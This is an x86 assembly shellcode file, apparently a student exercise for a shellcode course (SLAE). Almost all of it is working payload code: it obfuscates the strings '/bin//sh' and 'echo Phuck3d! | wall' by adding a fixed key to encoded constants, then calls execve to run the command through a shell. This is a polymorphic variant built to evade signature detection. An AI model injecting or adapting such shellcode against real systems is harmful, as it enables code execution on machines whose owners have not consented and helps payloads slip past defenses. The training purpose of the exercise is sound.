; Student ID: SLAE – 871

global _start
section .text
_start:

        ; ebx = /bin//sh
        push edx
mov edi, 0x10311020

; eax
     mov eax, 0x58421f0f
; eax, edi
     add eax, edi
     push eax
      ;  push 0x68732f2f
; eax
     mov eax, 0x5e38520f
; eax, edi
     add eax, edi
     push eax
      ;  push 0x6e69622f
        mov ebx, esp

        ; esi = echo Phuck3d! | wall
        push edx

     mov eax, 0x5c3b5157
     add eax, edi
     push eax
;        push 0x6c6c6177
    mov eax, 0x104b1001
    add eax, edi
    push eax
;        push 0x207c2021
        push 0x64336b63
;    mov eax, 0x65374000

mov eax, 0x85996040
    sub eax ,edi
    push eax
;        push 0x75685020
    mov eax, 0x5f375345
    add eax, edi
    push eax
;        push 0x6f686365
        mov esi, esp

;	push byte 11
; eax ==> al
xor eax, eax
	mov al, 12
	dec al
;	pop eax
;	cltd

	push edx
;mov ax, 0x521c
;add ax, 0x1111
;push word
	push word 0x632d
	mov ecx, esp

	push edx
	push esi
	push ecx
	push ebx
	mov ecx, esp

	int 0x80
